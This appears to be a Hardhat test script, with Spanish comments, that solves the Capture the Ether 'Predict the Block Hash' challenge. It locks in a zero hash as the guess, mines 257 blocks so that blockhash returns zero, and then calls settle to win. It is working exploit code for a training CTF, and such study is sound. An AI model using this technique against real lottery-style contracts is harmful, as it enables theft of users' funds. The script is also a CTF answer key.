import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract } from "ethers";
import { calmarLaManija } from "../../ayudines/calmarLaManija";

let blockhashContract: Contract;
const challengeAddress: string = "0x3a476198a3d3176a31a0d9746e9B16a830bb952B";

beforeEach(async () => {
  const blockhashFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge");
  blockhashContract = await blockhashFactory.attach(challengeAddress);
})

describe("Predict The Blockhash", async () => {
  it("Resuelve el Lottery challenge - Predict the block hash", async () => {
    await blockhashContract.lockInGuess(ethers.constants.HashZero, {
      value: ethers.utils.parseEther("1"),
      gasLimit: 1e5
    });

    //Espero que se minen 256 bloques más para asegurar que cuando se haga block.blockhash(BloqueDelContratoVictima), la EVM devuelva un valor determinístico (cero).
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine", []); // Usamos el método RPC para minar un bloque manualmente. También se puede "simular" el minado de bloques desde hardhat.config https://hardhat.org/hardhat-network/reference/#mining-modes
      console.log(await ethers.provider.getBlockNumber());
    }
    console.log("--------------SE HAN MINADO 256 BLOQUES!--------------");
    

    await blockhashContract.settle({ gasLimit: 1e5 });
    const isComplete = await blockhashContract.isComplete();
    expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
  })
})

//A tener en cuenta: Para resolver este desafío en la red de ropsten y obtener los puntos en CTE, se puede alterar este script para que se chequee constantemente el blockNumber de la red, y una vez que se hayan minado 256 bloques, ejecutar la llamada a "settle". Sin embargo, por timeouts del test o posibles complicaciones en la máquina que ejecute el script, es recomendable invocar el método lockInGuess con el hash 0x000... servirse un buen ferneth y volver después de un tiempo, donde ya seguramente se habrán minado 256 bloques, y llamar a la función "settle".